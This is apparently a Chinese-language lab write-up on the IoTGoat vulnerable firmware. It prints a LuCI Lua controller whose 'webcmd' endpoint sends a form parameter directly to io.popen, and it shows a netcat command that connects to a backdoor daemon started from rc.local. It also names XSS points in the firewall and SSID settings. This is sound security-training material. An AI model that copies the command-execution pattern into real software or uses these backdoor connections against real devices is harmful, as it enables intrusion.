> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HjMqLSaug53YRx8AF9VRcg)

继续接着上一章，本章节主要从不安全的生态系统接口入手。  

**不安全的生态系统接口**

**1.  web 后门**

web 界面 Url 包含可供开发者调试的接口

**查看 web 路由**

**(/usr/lib/lua/luci/controller/iotgoat/iotgoat.lua)**

发现执行命令的接口

```
module("luci.controller.iotgoat.iotgoat", package.seeall)
local http = require("luci.http")
function index()
   entry({"admin", "iotgoat"}, firstchild(), "IoTGoat", 60).dependent=false
   entry({"admin", "iotgoat", "cmdinject"}, template("iotgoat/cmd"), "", 1)
   entry({"admin", "iotgoat", "cam"}, template("iotgoat/camera"), "Camera", 2)
   entry({"admin", "iotgoat", "door"}, template("iotgoat/door"), "Doorlock", 3)
   entry({"admin", "iotgoat", "webcmd"}, call("webcmd"))
end

function webcmd()
   local cmd = http.formvalue("cmd")
   if cmd then
       local fp = io.popen(tostring(cmd).." 2>&1")
       local result =  fp:read("*a")
       fp:close()
       result = result:gsub("<", "<")
       http.write(tostring(result))
   else
       http.write_json(http.formvalue())
   end
end
```

可疑 url 汇总

```
admin/iotgoat/cmdinject
admin/iotgoat/cam
admin/iotgoat/door
admin/iotgoat/webcmd
```

*   admin/iotgoat/cmdinject
    

 **执行 netstat -atnp**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeSXEMXicXMKN231bg7P4vJuibiaceHdsZBhRxHgFiaA2VtpibKt6LBF38u3w/640?wx_fmt=png)

*   admin/iotgoat/webcmd
    

 **cmd 传参执行系统命令**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeTHGzx3JJYnROE1eApIEwmXzBia5yQakY1cw2fvxOxk9ClZZQibOjn5XA/640?wx_fmt=png)

### **2. 程序后门**  

```
$ netstat -antp #查看可疑进程
$ ps | grep shellback
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeibIzq5FefInOmUfDOPibT8RgC5fmeUnOROMdZY9CHa3zwfj7AE7UTVVw/640?wx_fmt=png)

查看固件开机启动项 (/etc/rc.local)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAe60jiaNMovxviaGIulRAfe2qc1MjzuzegpLoE9Bp9QgafOAV0wfPziau1g/640?wx_fmt=png)

**将程序拖入 IDA 分析**

一键 F5 反汇编

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeVf89smdk3rPfvOY7UzrnCnC2cp7dIVCPqIKdlu2fibnklH89CDI1B0A/640?wx_fmt=png)

使用 netcat 进行后门连接

```
$ nc -v 192.168.72.132 5515
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeYqGzwsHygPvpNr1cPBkWk7fice8P7FyNQErzOUVXlQkZ1xHIglh9mHQ/640?wx_fmt=png)

### 3. Web 漏洞  

**XSS 漏洞**

**反射型 xss**

配置 Firewall - Traffic Rules

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeoiaSwT03GDhsN4XvGgv3IG7rhLUXB6NR0KT5qkcehCa1DaC1tptoFew/640?wx_fmt=png)

配置 Firewall - Port Forwards

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAez6YqcQQVgvUcjdmGszae6zXoHicxYiaGz01wlgOEyRTy5cPqIwqjhMicg/640?wx_fmt=png)

**存储型 xss**

配置 SSID 名称

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAeTrYR7eerLXp8oLUocz570H6QmeawdyaoL6gdViaPKbgcmrrIMHERexg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQzWSK1U18EFk6uib4ZklpAetl2VL4NjOLxelFEHg5pl8LJXIfAxIRiaSf8RJsLIs4ocZZLTPCOJKxw/640?wx_fmt=png)

**总结**  

---------

1.  不可直接访问的 “秘密” 开发人员诊断页面，并向用户公开 shell 访问权限。

2.  配置在启动期间运行的持久后门守护进程。

3.  多个跨站点脚本 (XSS) 漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTqMVczDE3GyGU1hPA7RQQlIESOibcZaWMeJVMicz1JUKnoSKhomypNO0J7q4BAxqjgxmpWYYe17ia2A/640?wx_fmt=png)

如果您有意向加入我们，请留言: )，

或邮件投递简历：akast@hillstonenet.com